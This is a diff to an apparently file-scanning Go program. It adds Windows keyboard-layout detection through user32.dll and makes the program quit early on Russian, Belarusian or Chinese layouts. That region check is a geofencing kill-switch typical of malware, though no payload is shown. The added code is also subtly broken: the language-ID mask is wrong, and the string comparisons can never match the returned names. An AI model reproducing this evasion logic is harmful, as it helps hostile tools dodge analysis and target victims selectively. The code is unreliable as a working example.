@@ -15,6 +15,7 @@ import (
 	"runtime"
 	"strings"
 	"sync"
+	"syscall"
 	"time"
 )
 
@@ -96,6 +97,47 @@ func getRootPaths() []string {
 	default:
 		return []string{"/"}
 	}
+}
+
+func getLangName(langID uint16) string {
+	switch langID {
+	case 0x409:
+		return "EN - English"
+	case 0x419:
+		return "RU - Russian"
+	case 0x422:
+		return "UK - Ukrainian"
+	case 0x40C:
+		return "FR - French"
+	case 0x407:
+		return "DE - German"
+	case 0x410:
+		return "IT - Italian"
+	case 0x40A:
+		return "ES - Spanish"
+	case 0x411:
+		return "JA - Japanese"
+	case 0x416:
+		return "PT - Portuguese"
+	case 0x415:
+		return "PL - Polish"
+	case 0x423:
+		return "BE - Belarusian"
+	case 0x804:
+		return "ZH-CH - Chinese"
+	default:
+		return fmt.Sprintf("Unknown (0x%04X)", langID)
+	}
+}
+
+func getKeyboardLayout() (string, error) {
+	user32 := syscall.NewLazyDLL("user32.dll")
+	getKeyboardLayout := user32.NewProc("GetKeyboardLayout")
+
+	layout, _, _ := getKeyboardLayout.Call(0)
+	langID := uint16(layout & 0xFFF)
+
+	return getLangName(langID), nil
 }
 
 func processFile(path string, results chan<- ScanResult, wg *sync.WaitGroup) {
@@ -332,6 +374,12 @@ func main() {
 
 	if *helpPtr {
 		showHelp()
+		return
+	}
+
+	lang, _ := getKeyboardLayout()
+
+	if lang == "RU" || lang == "BE" || lang == "ZH-CH" {
 		return
 	}
 
